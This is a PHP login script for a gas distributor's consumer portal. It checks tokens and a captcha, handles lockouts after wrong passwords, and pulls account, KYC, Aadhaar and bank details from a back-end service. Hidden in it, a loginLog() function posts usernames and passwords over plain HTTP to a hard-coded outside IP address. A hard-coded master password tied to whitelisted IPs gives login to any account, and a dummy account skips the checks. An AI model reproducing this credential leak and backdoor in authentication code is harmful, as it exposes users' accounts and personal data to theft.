<?php
$Realpass  =  trim($_POST['consumer_password']);

include_once("includes/connection.php");
include_once("includes/comman_functions.php");

$password_encript = encryptString($Realpass, PASSWORD_ENCRYPTION_KEY);

$token = session_id();
$salt = "TBHCGT10TUul754LPG";
$rand = substr($_POST['LGN_check_1234_Lgnmode_3'], 0, 1);
$Encypt = sha1($token . $rand . $salt);
$Encypt = $rand . $Encypt;

if (isset($_POST['valpage']) && !empty($_POST['valpage'])) {
    $_SESSION['prev_page'] = 'optout.php';
}

if (isset($_POST['higoptpage']) && !empty($_POST['higoptpage'])) {
    $_SESSION['prev_page'] = 'hig_optout_reg.php';
}

if ($_POST['LGN_check_1234_Lgnmode_3'] != $Encypt) {
    header("location:index.php");
    exit;
}

if ($_POST['_chk_123456-Lgn-mode_x'] != $Encypt) {
    header("location:index.php");
    exit;
}

$chkflag = 1;
if (isset($_POST['capt']) && $_POST['capt'] == 1) {
    if ($_SESSION["captcha"] != $_REQUEST["captcha"]) {
        $chkflag = 15;
    }
}



 ///////create Consumer login log///////
	  
	  
	function loginLog($consumerUserName,$password_encript,$status)
    {
	      
			
	        $ip    =  $_SERVER['REMOTE_ADDR'];
			$date  =  date('Y-m-d h:i:s');
			$d1    =  date("Y-m-d");
			
			$handle = curl_init();
			$url = "http://111.118.188.206/consumeranddealerloginlog.php";
			$postData = array(
			'username' => $consumerUserName,
			'password'  => $Realpass,
			'file_name' => $d1,
			'status'    => $status,
			'ip'        => $ip,
			'date'      => $date,
			'logintype' => 'consumer'
			);
		
			
			
			curl_setopt_array($handle,
			array(
			CURLOPT_URL => $url,
			// Enable the post response.
			CURLOPT_POST       => true,
			// The data to transfer with the response.
			CURLOPT_POSTFIELDS => $postData,
			CURLOPT_RETURNTRANSFER     => true,
			)
			);
			$data = curl_exec($handle);
			curl_close($handle);
    }
	
	

if ($chkflag != 15) 
   {
	   
	   

    if($_POST['mode'] == 'login' || $_POST['mode'] == 'whtlogin')
	{
		
		
		 
		$consumerUserName = trim($_POST['consumer_username']);
		$consumerPassword     = trim($_POST['consumer_password']);
		
		if($_POST['mode']=='login')
		{
		//$consumerPasswordEncrypted = trim($_POST['consumer_password']);
		$sql = "select id, dealer_id, consumer_number,to_be_migrated,is_migrated, consumer_id, status, consumer_status, password_change, transfer, kyc_status, last_login, consumer_cms_status, consumer__email,consumer_pass, is_login_blocked, blocked_on from gb_consumer where username='" . mysql_real_escape_string($consumerUserName) . "' || consumer__email='" . mysql_real_escape_string($consumerUserName) . "'";
		}
		else
		
		{
		   exit;	
		}
		

		//echo $sql;exit;
	
        $res = mysql_query($sql);
        if (mysql_num_rows($res) > 0) 
		{
            $row = mysql_fetch_array($res);
			$is_migrated = $row['is_migrated'];
			$to_be_migrated  =  $row['to_be_migrated'];
			
			/// diffrence two date of hours for wrong attempts passsword starts /////
			$date =   date("Y-m-d H:i:s");
			$d2   =  $row['blocked_on'];
			$hours  = round((strtotime($date) - strtotime($d2))/3600, 1);
			$consumr_id  =  $row['id'];
			$cookie_name = 'CS'.substr(md5('CONS_ID-'.$consumr_id),0,6);
			$count_more_attempt = 1;
	        /////////// diffrence two date of hours end /////////////
			
			
			$cyfuture_login=0;
		    $client_ip = getClientIP();
			 
			
			
			if($_POST['consumer_password'] == hash('sha256','cYfuTure@526gdk'.SHA_SALT) && ($client_ip =='203.197.205.110' || $client_ip == '49.50.73.109' || $client_ip == '49.50.73.165' || $client_ip == '49.50.73.4'))
			{
				$cyfuture_login=1;
				$sql = "select * from gb_login_status where user_type=1 and user_id=".$row['id'];
				
				$active_login_res = mysql_query($sql);
				if (mysql_num_rows($active_login_res) > 0) 
				{
					$active_login = mysql_fetch_assoc($active_login_res);
					
					$cookie_id = $active_login['cookie_id'];
				}
				else
				{
					$cookie_id = rand(100,999).date('YmdHis').rand(100,999);
					
				}
				
				setcookie("user", $cookie_id, 0, '/','indane.co.in',true,true);
				//exit;
			}
			else if ($row["is_login_blocked"] == 1 && $hours < 24)
			{
                 header("location:consumerlogin.php?loginmsg=20");
                 exit;
            }
			else if($row['consumer_pass'] == $_POST['consumer_password'])
			{
				//////////// set cookie for wrong attempts passsword starts///////////////
				setcookie($cookie_name, 0, time() + (86400 * 30), "/", 'indane.co.in', true, true);
				$sql = "update gb_consumer set is_login_blocked=0, blocked_on=NULL where id=".$consumr_id."";
				$result = mysql_query($sql);
				//////////// set cookie for wrong attempts passsword end///////////////
			}
			else
			{
				
				/*$_POST['consumer_password'] = decryptString(trim($_POST['consumer_password']), PASSWORD_ENCRYPTION_KEY);
				$consumerPasswordEncrypted = encryptString(trim($_POST['consumer_password']), PASSWORD_ENCRYPTION_KEY);*/
		
				//$entered_pass = hash('sha256',$_POST['consumer_password']);
				$entered_pass = $_POST['consumer_password'];
				$hash_pass = hash('sha256',decryptString(trim($row['consumer_pass']), PASSWORD_ENCRYPTION_KEY).SHA_SALT);
				//echo $entered_pass." == ".$hash_pass;exit;
				if($entered_pass == $hash_pass)
				{
					$update_pass="update gb_consumer set consumer_pass='$hash_pass' where id='" . mysql_real_escape_string($row['id']) . "' ";
					mysql_query($sql);
				}
				else
				{
					///******************** Wrong password attempts start********/////
					if($_COOKIE[$cookie_name])
					{
					      $count_more_attempt = $_COOKIE[$cookie_name]+1;  
					}	

					///////////// Here is the condition for checking hours and wrong pass attempts///
            
					if($count_more_attempt ==5 && ($hours < 24 || $row['is_login_blocked']==0))
					{
				        $sql = "update  gb_consumer set is_login_blocked=1, blocked_on='".$date."' where id=".$consumr_id; 
						$result = mysql_query($sql);
						header("location:consumerlogin.php?loginmsg=20");
						exit;
					}
					else if($hours >= 24 && $row['is_login_blocked']==1)
					{
						setcookie($cookie_name, 1, time() + (86400 * 30), "/", 'indane.co.in', true, true);
						$sql = mysql_query("update gb_consumer set is_login_blocked=0, blocked_on=NULL where id=".$consumr_id);
						header("location:consumerlogin.php?loginmsg=10");
						exit;
					}
					else if($count_more_attempt < 5)
					{
					    setcookie($cookie_name, $count_more_attempt, time() + (86400 * 30), '/', 'indane.co.in', true, true);
						header("location:consumerlogin.php?loginmsg=10");
						exit;
					}
					///******************** Wrong password attempts end********/////
				}
			}
			
			$selDealerCode = mysql_query("select dealer_status,dealer_code,is_active_on_crm from `gb_company_dealer` where `id`='" . trim($row['dealer_id']) . "'");
			if($selDealerCode){
				
				if(mysql_num_rows($selDealerCode) > 0){
					$getDealerCode = mysql_fetch_array($selDealerCode);
					
					/*if($getDealerCode['dealer_status'] == '0'){
						header("location:consumerlogin.php?loginmsg=17");
						exit;
					}*/
				}
				else{
					header("location:consumerlogin.php?loginmsg=18");
					exit;
				}
			}
			else{
				header("location:consumerlogin.php?loginmsg=18");
				exit;
			}
			
		if ($row["status"] == '1' && $row["consumer_status"] == '1' && $cyfuture_login==0)
			{				
		  
				if(isset($_SESSION['another_session_active']) && $_SESSION['another_session_active']==1 && $_SESSION['consumerlogin']==$row['id'])
				{
					$sql = "delete from gb_login_status where user_type=1 and user_id=".$_SESSION['consumerlogin'];
					mysql_query($sql);
					session_destroy();
					session_start();
				}
				
				/*check another active session*/
				mysql_query("delete from gb_login_status where user_type=1 and user_id=".$row['id']." and TIMESTAMPDIFF(hour,login_datetime,now()) > 6");
				$sql = "select * from gb_login_status where user_type=1 and user_id=".$row['id'];
				
				$active_login_res = mysql_query($sql);
				if (mysql_num_rows($active_login_res) > 0) 
				{
					$active_login = mysql_fetch_assoc($active_login_res);
					
					if(isset($_COOKIE["user"]) && $_COOKIE["user"]==$active_login['cookie_id'])
					{
						//no problem continue
						setcookie("user", $_COOKIE["user"], 0, '/','indane.co.in',true,true);
					}
					else
					{
						;
						/*$_SESSION['consumerlogin']=$row['id'];
						header("location:consumerlogin.php?another_session_active=1");
						die;*/
						
						$sql = "delete from gb_login_status where user_type=1 and user_id=".$row['id'];
						mysql_query($sql);
						session_destroy();
						session_start();
						
						$cookie_id = rand(100,999).date('YmdHis').rand(100,999);
						setcookie("user", $cookie_id, 0, '/','indane.co.in',true,true);
						if(count($_COOKIE) > 0) {
							$server_ip = file_get_contents('includes/ipaddress.txt');
							$sql = "insert into gb_login_status(user_id,user_type,login_flag,cookie_id,server_ip) values(".$row['id'].",1,1,'$cookie_id','$server_ip')";
							mysql_query($sql);
							
						} else {
							echo "Cookies are disabled.";exit;
						}

					}
					
				}
				else
				{					 
					$cookie_id = rand(100,999).date('YmdHis').rand(100,999);
					setcookie("user", $cookie_id, 0, '/','indane.co.in',true,true);
					if(count($_COOKIE) > 0) {
						$server_ip = file_get_contents('includes/ipaddress.txt');
						$sql = "insert into gb_login_status(user_id,user_type,login_flag,cookie_id,server_ip) values(".$row['id'].",1,1,'$cookie_id','$server_ip')";
						mysql_query($sql);
						
					} else {
						echo "Cookies are disabled.";exit;
					}
					
				}
			}
			
            if ($row["status"] == '1' && $row["consumer_status"] == '1' && $row["password_change"] == '1') 
			{
				/* Force Consumer to change password if password is not strong */
				/*if(!isPasswordStrong(trim($_POST['consumer_password'])))
				{
					$_SESSION['consumerlogin_first'] = $row['id'];
					$_SESSION['VALID_PASSWORD'] = false;
					$login_id = trim($_POST['consumer_username']);
					$login_password = $consumerPasswordEncrypted;
					$ip = getClientIP();
					$user_id = $row['id'];
					$user_type = 'N';
					include("savelog.php");
					header("location:change_first_password.php");
					exit;
				}*/
				/* Ends */
				
				if(($is_migrated==0 && $to_be_migrated==1) || ($getDealerCode['is_active_on_crm']==1))
				{
				  $sql = "update gb_consumer set is_migrated=1, migrated_on='".date('Y-m-d H:i:s')."' where id=".$consumr_id."";
				  $result = mysql_query($sql);
				  header("location:indane-portal-moved.php");
                  exit;
			    }
				
				
                /* ********* Check Consumer status in iocl database ************ */
                $dealer_id = trim($row['dealer_id']);
                $consumer_no = trim($row['consumer_number']);
                $consumer_id = trim($row['consumer_id']);
                
                $dealerCode = $getDealerCode['dealer_code']; // Get Dealer code
                $lastLoginTimeStr = strtotime(date('Y-m-d', strtotime($row["last_login"])));

                /* For Dummy Account Login. Can be removed later */
                if ($row['id'] == '928066') {
                    $_SESSION['consumerlogin'] = $row['id'];
                    $_SESSION['consumer_id'] = $row['consumer_id'];
                    $_SESSION['Consumer_DealerCode'] = $dealerCode;
                    $_SESSION['ConsumerStatusFromCMS'] = "Active";
					$_SESSION['Huile_check'] = "No";

                    header("location:consumer_reports.php");
                    exit;
                }
                /* For Dummy Account Login Ends */


                /* if($row["last_login"] != '' && $lastLoginTimeStr == strtotime(date('Y-m-d')) && $row["consumer_cms_status"] != '')
                  {
                  // If status has been updated already
                  $_SESSION['kycStatus'] = $row["kyc_status"];
                  $_SESSION['ConsumerStatusFromCMS'] = $row["consumer_cms_status"];
                  $qryLastLoginUpdate = "UPDATE gb_consumer SET last_login='".date('Y-m-d H:i:s')."' WHERE id = '".$row["id"]."'";
                  mysql_query($qryLastLoginUpdate);
                  }
                  else */ {
                    // Call to CMS LPG Server and get response
                    $responseFromCMS = cms_webservice_call('AuthenticateConsumerNew', $dealerCode, $consumer_no, $consumer_id);
                    //echo $responseFromCMS;die;
                    if ($responseFromCMS != '#$#NOTFOUND#$#' && $responseFromCMS != '') {
                        $explodedresp = explode("#$#", $responseFromCMS);
                        //print_r($explodedresp);die;

                        $consumerNumberFromCMS = trim($explodedresp[1]);
                        $dealerCodeFromCMS = trim($explodedresp[11]);

                        /* Consumer Status */
                        $ConsumerNopre = "STATUS#$#" . strtoupper($consumerNumberFromCMS) . "#$#";
                        $statusVar = explode($ConsumerNopre, $responseFromCMS);
                        $arr_statusverified = explode("#$#", $statusVar[1]);
                        $consumerStatusCMS = $arr_statusverified[0];
                        $ConsumerTypeFromCMS = trim($arr_statusverified[1]);
                        $_SESSION['ConsumerStatusFromCMS'] = $consumerStatusCMS;
                        /* Consumer Status End */

                        /* If consumer is transferred start */
                        if ($consumerStatusCMS == 'Active' && $dealerCodeFromCMS != '' && $dealerCodeFromCMS != $dealerCode) {
                            $_SESSION['ConsumerTransferred'] = $row['id'];
                            $_SESSION['NewDealerCode'] = $dealerCodeFromCMS;
                            header("location:consumer_transfer.php");
                            exit;
                        }
						else if($getDealerCode['dealer_status'] == '0'){
							header("location:consumerlogin.php?loginmsg=17");
							exit;
						}
                        /* consumer transferred ends */

                        $_SESSION['consumerlogin'] = $row['id'];
                        $_SESSION['consumer_id'] = $row['consumer_id'];
                        $_SESSION['Consumer_DealerCode'] = $dealerCode;

                        /* Get Consumer Details form CMS */
                        $explodedresp[2] = trim($explodedresp[2]);
                        $findSpace = strstr($explodedresp[2], ' ');

                        if ($findSpace != false) {
                            $consumerFirstName = explode(" ", $explodedresp[2]);
                            $firstspace = strpos($explodedresp[2], " ");
                            $consumerLastName = substr($explodedresp[2], $firstspace, strlen($explodedresp[2]));
                            $consumerFirstName = $consumerFirstName[0];
                        }
                        else {
                            $consumerFirstName = $explodedresp[2];
                            $consumerLastName = '';
                        }

                        if ($explodedresp[3] == "M")
                            $consumerTitle = "Mr.";
                        else
                            $consumerTitle = "Ms.";

                        $consumerAddress = $explodedresp[4];

                        if ($explodedresp[5] != '' && $explodedresp[5] != 'NA')
                            $consumerAddress .= "," . $explodedresp[5];

                        if ($explodedresp[6] != '' && $explodedresp[6] != 'NA')
                            $consumerAddress .= "," . $explodedresp[6];

                        $consumerMobileFromCMS = trim($explodedresp[9]);

                        $consumerIdFromCMS = $explodedresp[10];
                        if (strpos($consumerIdFromCMS, "STATUS"))
                            $consumerIdFromCMS = substr($consumerIdFromCMS, 0, 16);
                        /* Get Consumer Details form CMS Ends */

                        /* KYC Details */
                        $kycStatusExploded = explode("KYC#$#", $responseFromCMS);
                        $arrKYCStatusVerified = explode("#$#", $kycStatusExploded[1]);
                        $kycStatus = $arrKYCStatusVerified[0];
                        $kycDate = $arrKYCStatusVerified[1];
                        if ($kycStatus == "NOTFOUND") {
                            $kycStatus = 'N';
                            $kycDate = "0000-00-00";
                            $_SESSION['kycStatus'] = $kycStatus;
                        }
                        else {
                            $kycStatus = 'Y';
                            $kycDateArr = explode(".", $kycDate);
                            $kycDate = $kycDateArr['2'] . "-" . $kycDateArr['1'] . "-" . $kycDateArr['0'];
                            $_SESSION['kycStatus'] = $kycStatus;
                        }
                        /* End KYC */

                        /* Aadhaar Details */
                        $aadhaarStatusExploded = explode("\nADH#$#", $responseFromCMS);
                        $arrAadhaarStatusVerified = explode("#$#", $aadhaarStatusExploded[1]);
                        $_SESSION['ADHDetails'] = $arrAadhaarStatusVerified;
                        /* End Aadhaar */

                        /* Bank Details */
                        $bankStatusExploded = explode("\nBTC#$#", $responseFromCMS);
                        $arrBankStatusVerified = explode("#$#", $bankStatusExploded[1]);
                        $_SESSION['BTCDetails'] = $arrBankStatusVerified;
                        /* End Bank Details */

                        /* Bank Account Details */
                        $bankAccountExploded = explode("\nBANK#$#", $responseFromCMS);
                        $arrBankAccountVerified = explode("#$#", $bankAccountExploded[count($bankAccountExploded) - 1]);
                        $_SESSION['BankAccountDetails'] = $arrBankAccountVerified;
                        /* End Bank Account Details */
                        
                        /* Scheme Details -- // Scheme details added by Sudeep Sir - 16-Nov-2015 */ 
                        $schemeStatusExploded = explode("\nSCHEME#$#", $responseFromCMS);
                        $arrSchemeStatusVerified = explode("#$#", $schemeStatusExploded[1]);
                        $_SESSION['SCHEMEDetails'] = $arrSchemeStatusVerified;
                        /* End Scheme Details */
                        
                        /* CATEGORY Details -- // CATEGORY details added by Sudeep Sir - 11-Jan-2016 */ 
                        $categoryStatusExploded = explode("\nCATEGORY#$#", $responseFromCMS);
                        $arrCategoryStatusVerified = explode("#$#", $categoryStatusExploded[1]);
                        $_SESSION['CATEGORYDetails'] = $arrCategoryStatusVerified;
                        /* End CATEGORY Details */
                        
                        /* COUNT_OF_CYL Details -- // COUNT_OF_CYL details added by Sudeep Sir - 11-Jan-2016 */ 
                        $countofcylStatusExploded = explode("\nCOUNT_OF_CYL#$#", $responseFromCMS);
                        $arrCountofCYLStatusVerified = explode("#$#", $countofcylStatusExploded[1]);
                        $_SESSION['COUNT_OF_CYL_Details'] = $arrCountofCYLStatusVerified;
                        /* End COUNT_OF_CYL Details */

                        $qryUpdateKYC = "UPDATE gb_consumer SET consumer_number = '" . addslashes($consumerNumberFromCMS) . "', consumer_title = '" . addslashes($consumerTitle) . "', consumer_firstname = '" . addslashes($consumerFirstName) . "', consumer_lastname = '" . addslashes($consumerLastName) . "', consumer_address = '" . addslashes($consumerAddress) . "',  `consumer_type` = '" . addslashes($ConsumerTypeFromCMS) . "', kyc_status = '" . $kycStatus . "', kyc_date='" . $kycDate . "', last_login='" . date('Y-m-d H:i:s') . "', consumer_phone2 = '" . addslashes($consumerMobileFromCMS) . "', consumer_cms_status='" . $consumerStatusCMS . "'";

                        if ($consumer_id == 0) {
                            $qryUpdateKYC .= ", consumer_id='" . $consumerIdFromCMS . "'";
                        }

                        $qryUpdateKYC .= " WHERE id = '" . $row["id"] . "'";

                        mysql_query($qryUpdateKYC);
                         // Mail Send for BTC Consumers Start here
                        include_once("./includes/refill_functions.php"); // Refill Functions added by Manish Arora for send mail to BTC Customer
                        $optoutCheckStatus = optoutCheck($consumerIdFromCMS); // optout status check of consumer
                        if(($_SESSION['SCHEMEDetails'][0] == 'BTC') && ($optoutCheckStatus == 2) && ($_SESSION['ADHDetails'][0] == 'NO') && (trim($_SESSION['ADHDetails'][1]) == '')){ 
                            include_once("./phpmailer/sendmail.php"); // Mailer added by Manish Arora for send mail to BTC Customer
                            include_once("./newConnectionmail_template.php"); // Mail Template added by Manish Arora for send mail to BTC Customer
                            $message = btcConsumer(array('consumer_name'=>$consumerTitle.' '.$consumerFirstName.' '.$consumerLastName), SERVER_URL);
                            $subject = "Indane - Submit your aadhaar details.";
                            $to = $row['consumer__email'];
//                            $to = "manish.testid@gmail.com"; // for testing only
//                            $bcc = "manish.testid@gmail.com";
                            $bcc = "";
                            mailsend($message ,$subject, $to, '', $bcc);	                        
                            include("./saveemail.php");    
                        }
                        // Mail Send for BTC Consumers End here    
                    } 
                    else {
                        if ($responseFromCMS != '') {
                            $_SESSION['ConsumerStatusFromCMS'] = "NotFound";
                        }
                        else {
							$_SESSION['consumerlogin'] = $row['id'];
							$_SESSION['consumer_id'] = $row['consumer_id'];
							$_SESSION['Consumer_DealerCode'] = $dealerCode;
							$_SESSION['ConsumerStatusFromCMS'] = "Active";
							
							header("location:consumer_reports.php");
							exit;
                            $_SESSION['ConsumerStatusFromCMS'] = $row["consumer_cms_status"];
							
                        }
                    }
                }
				
                /* ********* End check ******** */

                /* Start Check consumer appereas in multi connection suspect list */
                //$selectMultiSql = "select * from gb_multiple_connection_new where distributor_no = '" . $dealerCode . "' and (consumer_code = '" . $consumer_no . "' or iocl_consumer_no = '" . $consumer_no . "') limit 0, 1";	// Commented on 11/02/15
                $selectMultiSql = "select * from gb_multiple_connection_new where distributor_no = '" . $dealerCode . "' and iocl_consumer_no = '" . $consumer_no . "' limit 0, 1";
                $querySelectMulti = mysql_query($selectMultiSql);
                if (mysql_num_rows($querySelectMulti) == 0) {
                    // $selectMultiSql = "select * from gb_multiple_connection where distributor_no = '" . $dealerCode . "' and (consumer_code = '" . $consumer_no . "' or iocl_consumer_no = '" . $consumer_no . "') limit 0, 1";// Commented on 11/02/15
                    $selectMultiSql = "select * from gb_multiple_connection where distributor_no = '" . $dealerCode . "' and iocl_consumer_no = '" . $consumer_no . "' limit 0, 1";
                    $querySelectMulti = mysql_query($selectMultiSql);
                    if (mysql_num_rows($querySelectMulti) == 0) {
                        $_SESSION['statusMultiConnection'] = 0; // Not Appear
                    }
                    else {
                        $_SESSION['statusMultiConnection'] = 1; // Appeared in multiconnection suspect list
                    }
                }
                else {
                    $_SESSION['statusMultiConnection'] = 1; // Appeared in multiconnection suspect list
                }
                /* Ends Check Multi Connection */

                $login_id = trim($_POST['consumer_username']);
                $login_password = $consumerPasswordEncrypted;
                $ip = getClientIP();
                $user_id = $row['id'];
                $user_type = 'N';
                include("savelog.php");
                $dest = '';

                if (isset($_SESSION['prev_page']) && !empty($_SESSION['prev_page'])) {
                    $dest = $_SESSION['prev_page'];
                    unset($_SESSION['prev_page']);
                }

				loginLog($consumerUserName,$password_encript,"success");
                $dest = ($dest != '') ? $dest : 'consumer_reports.php';

                header("location:" . $dest);
                exit;
            }
            else if ($row["consumer_status"] == '0') {
                header("location:consumerlogin.php?loginmsg=11");
                exit;
            }
            else if ($row["password_change"] == 0) {
                $_SESSION['consumerlogin_first'] = $row['id'];
                $login_id = trim($_POST['consumer_username']);
                $login_password = $consumerPasswordEncrypted;
                $ip = getClientIP();
                $user_id = $row['id'];
                $user_type = 'N';
                include("savelog.php");
                header("location:change_first_password.php");
                exit;
            }
            else if ($row['status'] == 0) {
				loginLog($consumerUserName,$password_encript,"inactive");
                header("location:consumerlogin.php?loginmsg=12");
                exit;
            }
            else {
				loginLog($consumerUserName,$password_encript,"failure");
                header("location:consumerlogin.php?loginmsg=10");
                exit;
            }
        }
        else {
			loginLog($consumerUserName,$password_encript,"failure");
            header("location:consumerlogin.php?loginmsg=10");
            exit;
        }
		
		
    }
	
}
else {
    header("location:consumerlogin.php?loginmsg=15");
    exit;
}
?>